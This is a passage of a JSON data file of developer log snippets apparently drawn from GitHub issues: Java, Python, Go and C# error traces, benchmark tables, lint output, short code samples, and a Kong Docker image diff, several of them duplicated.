net.minecraft.client.main.Main.main(SourceFile:148) [Main.class:?]\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_51]\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_51]\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_51]\r\n\tat java.lang.reflect.Method.invoke(Method.java:497) ~[?:1.8.0_51]\r\n\tat net.minecraft.launchwrapper.Launch.launch(Launch.java:135) [launchwrapper-1.11.jar:?]\r\n\tat net.minecraft.launchwrapper.Launch.main(Launch.java:28) [launchwrapper-1.11.jar:?]\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_51]\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_51]\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_51]\r\n\tat java.lang.reflect.Method.invoke(Method.java:497) ~[?:1.8.0_51]\r\n\tat org.multimc.onesix.OneSixLauncher.launchWithMainClass(OneSixLauncher.java:310) [NewLaunch.jar:?]\r\n\tat org.multimc.onesix.OneSixLauncher.launch(OneSixLauncher.java:394) [NewLaunch.jar:?]\r\n\tat org.multimc.EntryPoint.listen(EntryPoint.java:170) [NewLaunch.jar:?]\r\n\tat org.multimc.EntryPoint.main(EntryPoint.java:54) [NewLaunch.jar:?]"
    },
    {
        "logs": "    1008 => {\r\n      title: 'GDrive access forbidden',\r\n      what_about: \"Google denied access to GDrive. If you use Google Apps contact your administrator to allow third party Drive applications and try again.\",\r\n      source: ERROR_SOURCE_USER\r\n    },"
    },
    {
        "logs": "# With acceleration\r\n\r\nBenchmark                         Mode  Cnt      Score     Error  Units\r\nBenchmarkContains.containsLarge   avgt   40     71.862 \u00b1   5.357  ns/op\r\nBenchmarkContains.containsMedium  avgt   40  13439.161 \u00b1 340.400  ns/op\r\nBenchmarkContains.containsSmall   avgt   40     60.485 \u00b1   1.567  ns/op\r\nBenchmarkContains.containsXLarge  avgt   40     60.850 \u00b1   0.954  ns/op\r\n\r\n\r\n# Without acceleration\r\n\r\nBenchmark                         Mode  Cnt       Score      Error  Units\r\nBenchmarkContains.containsLarge   avgt   40   21987.840 \u00b1  478.695  ns/op\r\nBenchmarkContains.containsMedium  avgt   40   12561.005 \u00b1  938.193  ns/op\r\nBenchmarkContains.containsSmall   avgt   40    1579.406 \u00b1   77.845  ns/op\r\nBenchmarkContains.containsXLarge  avgt   40  141919.300 \u00b1 4259.996  ns/op"
    },
    {
        "logs": "# With acceleration\r\n\r\nBenchmark                         Mode  Cnt      Score     Error  Units\r\nBenchmarkContains.containsLarge   avgt   40     71.862 \u00b1   5.357  ns/op\r\nBenchmarkContains.containsMedium  avgt   40  13439.161 \u00b1 340.400  ns/op\r\nBenchmarkContains.containsSmall   avgt   40     60.485 \u00b1   1.567  ns/op\r\nBenchmarkContains.containsXLarge  avgt   40     60.850 \u00b1   0.954  ns/op\r\n\r\n\r\n# Without acceleration\r\n\r\nBenchmark                         Mode  Cnt       Score      Error  Units\r\nBenchmarkContains.containsLarge   avgt   40   21987.840 \u00b1  478.695  ns/op\r\nBenchmarkContains.containsMedium  avgt   40   12561.005 \u00b1  938.193  ns/op\r\nBenchmarkContains.containsSmall   avgt   40    1579.406 \u00b1   77.845  ns/op\r\nBenchmarkContains.containsXLarge  avgt   40  141919.300 \u00b1 4259.996  ns/op"
    },
    {
        "logs": "    error CS1002: ; expected\r\n    error CS1002: ; expected\r\n    error CS1513: } expected\r\n    error CS0201: Only assignment, call, increment, decrement, await, and new object expressions can be used as a statement"
    },
    {
        "logs": "    error CS1002: ; expected\r\n    error CS1002: ; expected\r\n    error CS1513: } expected\r\n    error CS0201: Only assignment, call, increment, decrement, await, and new object expressions can be used as a statement"
    },
    {
        "logs": "diff\r\ndiff --git a/_bashbrew-arches b/_bashbrew-arches\r\nindex 4581ec5..d972979 100644\r\n--- a/_bashbrew-arches\r\n+++ b/_bashbrew-arches\r\n@@ -7,4 +7,6 @@ kong:0.13-centos @ amd64\r\n kong:0.14-centos @ amd64\r\n kong:1.0rc2 @ amd64\r\n kong:1.0rc2-centos @ amd64\r\n+kong:1.0rc3 @ amd64\r\n+kong:1.0rc3-centos @ amd64\r\n kong:latest @ amd64\r\ndiff --git a/_bashbrew-list b/_bashbrew-list\r\nindex cc539b5..d059cd6 100644\r\n--- a/_bashbrew-list\r\n+++ b/_bashbrew-list\r\n@@ -23,7 +23,13 @@ kong:0.14.1-centos\r\n kong:1.0rc2\r\n kong:1.0rc2-alpine\r\n kong:1.0rc2-centos\r\n+kong:1.0rc3\r\n+kong:1.0rc3-alpine\r\n+kong:1.0rc3-centos\r\n kong:1.0.0rc2\r\n kong:1.0.0rc2-alpine\r\n kong:1.0.0rc2-centos\r\n+kong:1.0.0rc3\r\n+kong:1.0.0rc3-alpine\r\n+kong:1.0.0rc3-centos\r\n kong:latest\r\ndiff --git a/kong_1.0rc2-centos/Dockerfile b/kong_1.0rc3-centos/Dockerfile\r\nsimilarity index 47%\r\ncopy from kong_1.0rc2-centos/Dockerfile\r\ncopy to kong_1.0rc3-centos/Dockerfile\r\nindex c736934..315701f 100644\r\n--- a/kong_1.0rc2-centos/Dockerfile\r\n+++ b/kong_1.0rc3-centos/Dockerfile\r\n@@ -1,10 +1,16 @@\r\n FROM centos:7\r\n LABEL maintainer=\"Kong Core Team <team-core@konghq.com>\"\r\n \r\n-ENV KONG_VERSION 1.0.0rc2\r\n+ENV KONG_VERSION 1.0.0rc3\r\n \r\n RUN yum install -y wget https://bintray.com/kong/kong-community-edition-rpm/download_file?file_path=centos/7/kong-community-edition-$KONG_VERSION.el7.noarch.rpm && \\\r\n-    yum clean all\r\n+    yum clean all && \\\r\n+    # OpenShift specific. OpenShift runs containers using an arbitrarily assigned user ID.\r\n+    # This user doesn't have access to change file permissions during runtime, they have to be changed during image building.\r\n+    # https://docs.okd.io/latest/creating_images/guidelines.html#use-uid\r\n+    mkdir -p \"/usr/local/kong\" && \\\r\n+    chgrp -R 0 \"/usr/local/kong\" && \\\r\n+    chmod -R g=u \"/usr/local/kong\"\r\n \r\n COPY docker-entrypoint.sh /docker-entrypoint.sh\r\n ENTRYPOINT [\"/docker-entrypoint.sh\"]\r\ndiff --git a/kong_0.14-centos/docker-entrypoint.sh b/kong_1.0rc3-centos/docker-entrypoint.sh\r\nsimilarity index 100%\r\ncopy from kong_0.14-centos/docker-entrypoint.sh\r\ncopy to kong_1.0rc3-centos/docker-entrypoint.sh\r\ndiff --git a/kong_1.0rc2/Dockerfile b/kong_1.0rc3/Dockerfile\r\nsimilarity index 58%\r\ncopy from kong_1.0rc2/Dockerfile\r\ncopy to kong_1.0rc3/Dockerfile\r\nindex 4673094..dcedeae 100644\r\n--- a/kong_1.0rc2/Dockerfile\r\n+++ b/kong_1.0rc3/Dockerfile\r\n@@ -1,8 +1,8 @@\r\n FROM alpine:3.6\r\n LABEL maintainer=\"Kong Core Team <team-core@konghq.com>\"\r\n \r\n-ENV KONG_VERSION 1.0.0rc2\r\n-ENV KONG_SHA256 42eba2f0c566740472ce69aae44dd93df81a75f494f32f45285426545ba1e914\r\n+ENV KONG_VERSION 1.0.0rc3\r\n+ENV KONG_SHA256 4af1b014cb9a827149c74d3fe795fab6a96892cf07eb7bafc197d7c23b0bd2a4\r\n \r\n RUN apk add --no-cache --virtual .build-deps wget tar ca-certificates \\\r\n[Truncated]\n \t&& cp -R /tmp/etc / \\\r\n \t&& rm -rf /tmp/etc \\\r\n-\t&& apk del .build-deps\r\n+\t&& apk del .build-deps \\\r\n+\t# OpenShift specific. OpenShift runs containers using an arbitrarily assigned user ID.\r\n+\t# This user doesn't have access to change file permissions during runtime, they have to be changed during image building.\r\n+\t# https://docs.okd.io/latest/creating_images/guidelines.html#use-uid\r\n+\t&& mkdir -p \"/usr/local/kong\" \\\r\n+\t&& chgrp -R 0 \"/usr/local/kong\" \\\r\n+\t&& chmod -R g=u \"/usr/local/kong\"\r\n \r\n COPY docker-entrypoint.sh /docker-entrypoint.sh\r\n ENTRYPOINT [\"/docker-entrypoint.sh\"]\r\ndiff --git a/kong_0.14-centos/docker-entrypoint.sh b/kong_1.0rc3/docker-entrypoint.sh\r\nsimilarity index 100%\r\ncopy from kong_0.14-centos/docker-entrypoint.sh\r\ncopy to kong_1.0rc3/docker-entrypoint.sh"
    },
    {
        "logs": "https://github.com/benjiebob/SMALViewer/issues/4\r\n\r\n\r\n\r\nHere's the code that is throwing error (not my code):"
    },
    {
        "logs": "info \u2022 Sort constructor declarations before other members \u2022 lib/model/response/favorites_error_response.dart:41:11 \u2022 sort_constructors_first"
    },
    {
        "logs": "var a = 'info \u2022 Sort constructor declarations before other members \u2022 lib/model/response/favorites_error_response.dart:41:11 \u2022 sort_constructors_first'\r\n\r\na.match(/error.+\\.dart:\\d+:\\d+/)"
    },
    {
        "logs": "[ 'error_response.dart:41:11',\r\n  index: 89,\r\n  input: 'info \u2022 Sort constructor declarations before other members \u2022 lib/model/response/favorites_error_response.dart:41:11 \u2022 sort_constructors_first',\r\n  groups: undefined ]"
    },
    {
        "logs": "info \u2022 Sort constructor declarations before other members \u2022 lib/model/response/favorites_error_response.dart:41:11 \u2022 sort_constructors_first"
    },
    {
        "logs": "ruby\r\nfuture = Celluloid::Future.new\r\nfuture.signal(1234)\r\nfuture.value #=> NoMethodError: undefined method `value' for 1234:Fixnum"
    },
    {
        "logs": "An unexpected error has occurred, please consider sending the                           |  54%\r\nfollowing traceback to the conda GitHub issue tracker at:\r\n\r\n    https://github.com/conda/conda/issues\r\n\r\nInclude the output of the command 'conda info' in your report.\r\n\r\n\r\nTraceback (most recent call last):\r\n  File \"/home/username_0/anaconda/bin/conda\", line 5, in <module>\r\n    \r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/main.py\", line 202, in main\r\n    args_func(args, p)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/main.py\", line 207, in args_func\r\n    args.func(args, p)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/main_update.py\", line 40, in execute\r\n    install.install(args, parser, 'update')\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/install.py\", line 420, in install\r\n    plan.execute_actions(actions, index, verbose=not args.quiet)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/plan.py\", line 502, in execute_actions\r\n    inst.execute_instructions(plan, index, verbose)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/instructions.py\", line 140, in execute_instructions\r\n    cmd(state, arg)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/instructions.py\", line 84, in LINK_CMD\r\n    link(state['prefix'], arg, index=state['index'])\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/instructions.py\", line 80, in link\r\n    install.link(pkgs_dir, prefix, dist, lt, index=index)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/install.py\", line 534, in link\r\n    _link(src, dst, lt)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/install.py\", line 133, in _link\r\n    shutil.copy2(src, dst)\r\n  File \"/home/username_0/anaconda/lib/python2.7/shutil.py\", line 130, in copy2\r\n    copyfile(src, dst)\r\n  File \"/home/username_0/anaconda/lib/python2.7/shutil.py\", line 83, in copyfile\r\n    with open(dst, 'wb') as fdst:\r\nIOError: [Errno 13] Permission denied: '/home/username_0/anaconda/lib/python2.7/site-packages/zmq/utils/compiler.json'"
    },
    {
        "logs": "An unexpected error has occurred, please consider sending the                           |  54%\r\nfollowing traceback to the conda GitHub issue tracker at:\r\n\r\n    https://github.com/conda/conda/issues\r\n\r\nInclude the output of the command 'conda info' in your report.\r\n\r\n\r\nTraceback (most recent call last):\r\n  File \"/home/username_0/anaconda/bin/conda\", line 5, in <module>\r\n    \r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/main.py\", line 202, in main\r\n    args_func(args, p)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/main.py\", line 207, in args_func\r\n    args.func(args, p)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/main_update.py\", line 40, in execute\r\n    install.install(args, parser, 'update')\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/cli/install.py\", line 420, in install\r\n    plan.execute_actions(actions, index, verbose=not args.quiet)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/plan.py\", line 502, in execute_actions\r\n    inst.execute_instructions(plan, index, verbose)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/instructions.py\", line 140, in execute_instructions\r\n    cmd(state, arg)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/instructions.py\", line 84, in LINK_CMD\r\n    link(state['prefix'], arg, index=state['index'])\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/instructions.py\", line 80, in link\r\n    install.link(pkgs_dir, prefix, dist, lt, index=index)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/install.py\", line 534, in link\r\n    _link(src, dst, lt)\r\n  File \"/home/username_0/anaconda/lib/python2.7/site-packages/conda/install.py\", line 133, in _link\r\n    shutil.copy2(src, dst)\r\n  File \"/home/username_0/anaconda/lib/python2.7/shutil.py\", line 130, in copy2\r\n    copyfile(src, dst)\r\n  File \"/home/username_0/anaconda/lib/python2.7/shutil.py\", line 83, in copyfile\r\n    with open(dst, 'wb') as fdst:\r\nIOError: [Errno 13] Permission denied: '/home/username_0/anaconda/lib/python2.7/site-packages/zmq/utils/compiler.json'"
    },
    {
        "logs": "bash\r\n$ pykwalify -d data.yml -s schema.yml\r\nTraceback (most recent call last):\r\n  File \"/home/vagrant/tycho/bin/pykwalify\", line 9, in <module>\r\n    load_entry_point('pykwalify==1.1.0', 'console_scripts', 'pykwalify')()\r\n  File \"/home/lib/python2.7/site-packages/pykwalify/cli.py\", line 79, in cli_entrypoint\r\n    run(parse_cli())\r\n  File \"/home/lib/python2.7/site-packages/pykwalify/cli.py\", line 66, in run\r\n    c.validate()\r\n  File \"/home/lib/python2.7/site-packages/pykwalify/core.py\", line 108, in validate\r\n    errors = self._start_validate(self.source)\r\n  File \"/home/lib/python2.7/site-packages/pykwalify/core.py\", line 151, in _start_validate\r\n    self._validate(value, root_rule, path, errors, done)\r\n  File \"/home/lib/python2.7/site-packages/pykwalify/core.py\", line 172, in _validate\r\n    self._validate_mapping(value, rule, path, errors, done=None)\r\n  File \"/home/lib/python2.7/site-packages/pykwalify/core.py\", line 352, in _validate_mapping\r\n    self._validate(v, r, \"{}/{}\".format(path, k), errors, done)\r\n  File \"/home/lib/python2.7/site-packages/pykwalify/core.py\", line 170, in _validate\r\n    self._validate_sequence(value, rule, path, errors, done=None)\r\n  File \"/home/lib/python2.7/site-packages/pykwalify/core.py\", line 216, in _validate_sequence\r\n    self._validate(item, r, \"{}/{}\".format(path, i), errors, done)\r\n  File \"/home/lib/python2.7/site-packages/pykwalify/core.py\", line 172, in _validate\r\n    self._validate_mapping(value, rule, path, errors, done=None)\r\n  File \"/home/lib/python2.7/site-packages/pykwalify/core.py\", line 310, in _validate_mapping\r\n    for k, v in value.items():\r\nAttributeError: 'str' object has no attribute 'items'"
    },
    {
        "logs": ", not seen in the wild but certainly arguable\r\n\r\nNone seems to me to have an overwhelming advantage.  While I do respect David's understanding of objects as records, Ramda has no particular reason to choose that interpretation of the objects passed to it over a dictionary one.\r\n\r\nI'm not really suggesting any changes here.  I like what Simon has done with "
    },
    {
        "logs": "php\r\nclass A__AopProxied {\r\n    private static $instance;\r\n    public static function getInstance() {\r\n        // ... logic\r\n        return self::$instance; // <== If in this place you change self to static or to \"A\", you will get fatal\r\n    }\r\n}\r\n\r\nclass A extends A__AopProxied {\r\n}"
    },
    {
        "logs": "php\r\nclass A__AopProxied {\r\n    private static $instance;\r\n    public static function getInstance() {\r\n        // ... logic\r\n        return self::$instance; // <== If in this place you change self to static or to \"A\", you will get fatal\r\n    }\r\n}\r\n\r\nclass A extends A__AopProxied {\r\n}"
    },
    {
        "logs": "hack/test-cmd.sh:114: executing 'oc new-project 'cmd-admin'' expecting success\r\nFAILURE after 30.287s: hack/test-cmd.sh:114: executing 'oc new-project 'cmd-admin'' expecting success: the command returned the wrong error code\r\nThere was no output from the command.\r\nStandard error from the command:"
    },
    {
        "logs": "I0822 11:26:47.002253   20501 wrap.go:42] POST /apis/rbac.authorization.k8s.io/v1beta1/namespaces/cmd-admin/rolebindings: (7.002020944s) 500\r\ngoroutine 32608 [running]:\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/httplog.(*respLogger).recordStatus(0xc42628c310, 0x1f4)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/httplog/httplog.go:207 +0xdd\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/httplog.(*respLogger).WriteHeader(0xc42628c310, 0x1f4)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/httplog/httplog.go:186 +0x35\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters.(*baseTimeoutWriter).WriteHeader(0xc42ffaab80, 0x1f4)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters/timeout.go:185 +0xb5\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/filters.(*auditResponseWriter).WriteHeader(0xc4266aae00, 0x1f4)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/filters/audit.go:186 +0x55\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/metrics.(*responseWriterDelegator).WriteHeader(0xc4293d8c90, 0x1f4)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/metrics/metrics.go:135 +0x45\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers/responsewriters.WriteObjectNegotiated(0x7ff410631640, 0xc429817c80, 0xee61180, 0xc423175bc0, 0x59ad392, 0x19, 0x594307d, 0x7, 0xee4d880, 0xc425e217b8, ...)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers/responsewriters/writers.go:113 +0x137\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers/responsewriters.ErrorNegotiated(0x7ff410631640, 0xc429817c80, 0xee268c0, 0xc430cd71c0, 0xee61180, 0xc423175bc0, 0x59ad392, 0x19, 0x594307d, 0x7, ...)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers/responsewriters/writers.go:135 +0x165\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers.(*RequestScope).err(0xc4248c3a40, 0xee268c0, 0xc430cd71c0, 0xee4d880, 0xc425e217b8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers/rest.go:80 +0x10e\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers.createHandler.func1(0xee4d880, 0xc425e217b8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/handlers/rest.go:465 +0x1131\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints.restfulCreateResource.func1(0xc4293d8c00, 0xc42fabae40)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/installer.go:1027 +0xd5\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/metrics.InstrumentRouteFunc.func1(0xc4293d8c00, 0xc42fabae40)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/metrics/metrics.go:104 +0x1cf\r\ngithub.com/openshift/origin/vendor/github.com/emicklei/go-restful.(*Container).dispatch(0xc420e7cb40, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/github.com/emicklei/go-restful/container.go:277 +0xb8d\r\ngithub.com/openshift/origin/vendor/github.com/emicklei/go-restful.(*Container).Dispatch(0xc420e7cb40, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/github.com/emicklei/go-restful/container.go:199 +0x57\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server.director.ServeHTTP(0x595f5a1, 0xe, 0xc420e7cb40, 0xc422679650, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/handler.go:153 +0x6e7\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server.(*director).ServeHTTP(0xc4265368e0, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t<autogenerated>:70 +0x86\r\ngithub.com/openshift/origin/vendor/k8s.io/kube-aggregator/pkg/apiserver.(*proxyHandler).ServeHTTP(0xc4244dd480, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/kube-aggregator/pkg/apiserver/handler_proxy.go:91 +0x122\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/mux.(*pathHandler).ServeHTTP(0xc42b5b3e40, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/mux/pathrecorder.go:248 +0x3dd\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/mux.(*PathRecorderMux).ServeHTTP(0xc423754fc0, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/mux/pathrecorder.go:234 +0x72\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server.director.ServeHTTP(0x596544d, 0xf, 0xc4272f1680, 0xc423754fc0, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/handler.go:161 +0x301\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server.(*director).ServeHTTP(0xc42abbdd80, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t<autogenerated>:70 +0x86\r\ngithub.com/openshift/origin/pkg/cmd/server/origin.namespacingFilter.func1(0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/pkg/cmd/server/origin/handlers.go:96 +0xd2\r\nnet/http.HandlerFunc.ServeHTTP(0xc425db7080, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/usr/local/go/src/net/http/server.go:1942 +0x44\r\ngithub.com/openshift/origin/pkg/cmd/server/handlers.AuthorizationFilter.func1(0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/pkg/cmd/server/handlers/authorization.go:64 +0x113\r\nnet/http.HandlerFunc.ServeHTTP(0xc42b8fc640, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/usr/local/go/src/net/http/server.go:1942 +0x44\r\ngithub.com/openshift/origin/pkg/cmd/server/handlers.ImpersonationFilter.func1(0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/pkg/cmd/server/handlers/impersonation.go:147 +0x2e9a\r\nnet/http.HandlerFunc.ServeHTTP(0xc425bc75e0, 0xee4d7c0, 0xc425e217a8, 0xc42e827c00)\r\n\t/usr/local/go/src/net/http/server.go:1942 +0x44\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/filters.WithAudit.func1(0x7ff4106316d0, 0xc425e21798, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/endpoints/filters/audit.go:127 +0x85c\r\nnet/http.HandlerFunc.ServeHTTP(0xc425bc7630, 0x7ff4106316d0, 0xc425e21798, 0xc42e827c00)\r\n\t/usr/local/go/src/net/http/server.go:1942 +0x44\r\ngithub.com/openshift/origin/pkg/cmd/server/handlers.AuthenticationHandlerFilter.func1(0x7ff4106316d0, 0xc425e21798, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/pkg/cmd/server/handlers/authentication.go:32 +0x299\r\nnet/http.HandlerFunc.ServeHTTP(0xc42b8fc680, 0x7ff4106316d0, 0xc425e21798, 0xc42e827c00)\r\n\t/usr/local/go/src/net/http/server.go:1942 +0x44\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters.WithCORS.func1(0x7ff4106316d0, 0xc425e21798, 0xc42e827c00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters/cors.go:75 +0x189\r\nnet/http.HandlerFunc.ServeHTTP(0xc4246ea000, 0x7ff4106316d0, 0xc425e21798, 0xc42e827c00)\r\n\t/usr/local/go/src/net/http/server.go:1942 +0x44\r\ngithub.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters.(*timeoutHandler).ServeHTTP.func1(0xc42abbdf60, 0xee64d40, 0xc425e21798, 0xc42e827c00, 0xc42fabac00)\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters/timeout.go:91 +0x8d\r\ncreated by github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters.(*timeoutHandler).ServeHTTP\r\n\t/go/src/github.com/openshift/origin/_output/local/go/src/github.com/openshift/origin/vendor/k8s.io/apiserver/pkg/server/filters/timeout.go:93 +0x1c0\r\n\r\nlogging error output: \"k8s\\x00\\n\\f\\n\\x02v1\\x12\\x06Status\\x123\\n\\x04\\n\\x00\\x12\\x00\\x12\\aFailure\\x1a\\x1detcdserver: request timed out\\\"\\x000\\xf4\\x03\\x1a\\x00\\\"\\x00\""
    },
    {
        "logs": "I0831 14:52:32.816638   20662 trace.go:76] Trace[73421993]: \"GuaranteedUpdate etcd3: *api.ServiceAccount\" (started: 2017-08-31 14:52:25.815545555 +0000 UTC) (total time: 7.001059231s):\r\nTrace[73421993]: [31.869\u00c2\u00b5s] [31.869\u00c2\u00b5s] initial value restored\r\nTrace[73421993]: [101.779\u00c2\u00b5s] [69.91\u00c2\u00b5s] Transaction prepared\r\nTrace[73421993]: [7.001059231s] [7.000957452s] END\r\nE0831 14:52:32.816669   20662 status.go:62] apiserver received an error that is not an metav1.Status: etcdserver: request timed out\r\nI0831 14:52:32.816846   20662 trace.go:76] Trace[186387414]: \"Update /api/v1/namespaces/kube-system/serviceaccounts/daemon-set-controller\" (started: 2017-08-31 14:52:25.81547282 +0000 UTC) (total time: 7.001354058s):\r\nTrace[186387414]: [15.846\u00c2\u00b5s] [15.846\u00c2\u00b5s] About to convert to expected version"
    },
    {
        "logs": "$ python objectmapping.py \r\nAll detected objects: 173\r\nAll admissible intersections: 588\r\nIteration #1.0: accepted 39 changes\r\nIteration #2.0: accepted 11 changes\r\nIteration #3.0: accepted 5 changes\r\nIteration #4.0: accepted 6 changes\r\nIteration #5.0: accepted 0 changes\r\nIteration #6.0: accepted 2 changes\r\nIteration #7.0: accepted 2 changes\r\nIteration #8.0: accepted 0 changes\r\nIteration #9.0: accepted 3 changes\r\nIteration #10.0: accepted 0 changes\r\nIteration #11.0: accepted 0 changes\r\nIteration #12.0: accepted 0 changes\r\nIteration #13.0: accepted 0 changes\r\nIteration #14.0: accepted 0 changes\r\nIteration #15.0: accepted 0 changes\r\n1.8701753724315352e-05\r\nICM inrersections: 116\r\nNumber of output ICM clusters: 51\r\nElapsed total time: 0.24 seconds."
    },
    {
